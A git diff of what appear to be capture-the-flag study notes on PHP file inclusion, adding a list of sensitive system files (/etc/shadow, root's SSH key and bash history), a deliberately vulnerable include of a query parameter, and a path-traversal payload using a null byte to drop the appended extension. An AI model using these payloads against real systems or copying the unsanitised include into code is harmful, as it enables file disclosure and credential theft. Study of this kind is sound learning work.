@@ -51,24 +51,42 @@
 - https://crackstation.net/
 
 ## File Inclusion
-common OS files:
+
+**common OS files:**
 - /etc/issue, /etc/profile, /proc/version, /etc/passwd,
 - /etc/shadow, /root/.bash_history, /var/log/dmessage,
 - /var/mail/root, /root/.ssh/id_rsa, /var/log/apache2/access.log
 - C:\boot.ini
 
-php function reason: https://www.php.net/manual/en/function.file-get-contents.php
 
-Local File Inclusion (LFI)
+**Php include function:**
+- https://www.php.net/manual/en/function.include.php
+
+
+**file-get-contents.php:** 
+- https://www.php.net/manual/en/function.file-get-contents.php
+- user's input is passed to a function such as file_get_contents in PHP.
+-  It's important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. 
+```php
+file_get_contents(
+    string $filename,
+    bool $use_include_path = false,
+    resource $context = ?,
+    int $offset = 0,
+    int $length = ?
+): string|false
+```
+
+**Local File Inclusion (LFI)**
 ```php
 <?PHP 
 	include("languages/". $_GET['lang']); 
 ?>
 ```
 
-Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
+Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12. Auto add ".php".
 - Conquer: ``` include("languages/../../../../../etc/passwd%00").".php"); ``` %00 or 0x00
 - NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.
 
-
+**Remote File Inclusion - RFI**
 
